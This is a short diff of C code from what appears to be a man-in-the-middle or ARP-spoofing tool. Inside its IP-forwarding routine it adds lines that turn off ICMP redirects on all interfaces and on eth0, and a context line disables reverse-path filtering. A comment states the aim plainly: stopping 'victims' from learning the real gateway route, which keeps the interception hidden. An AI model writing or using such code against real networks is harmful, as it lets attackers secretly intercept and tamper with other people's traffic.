@@ -107,6 +107,12 @@ int enable_ip_forwarding() {
   rp = fopen("/proc/sys/net/ipv4/conf/all/rp_filter", "w");
   if (rp) { fprintf(rp, "0"); fclose(rp); }
 
+  // Disable ICMP redirects (vital to prevent victims from learning the real gateway route)
+  FILE *sr = fopen("/proc/sys/net/ipv4/conf/all/send_redirects", "w");
+  if (sr) { fprintf(sr, "0"); fclose(sr); }
+  sr = fopen("/proc/sys/net/ipv4/conf/eth0/send_redirects", "w");
+  if (sr) { fprintf(sr, "0"); fclose(sr); }
+  
   return 0;
 }
 
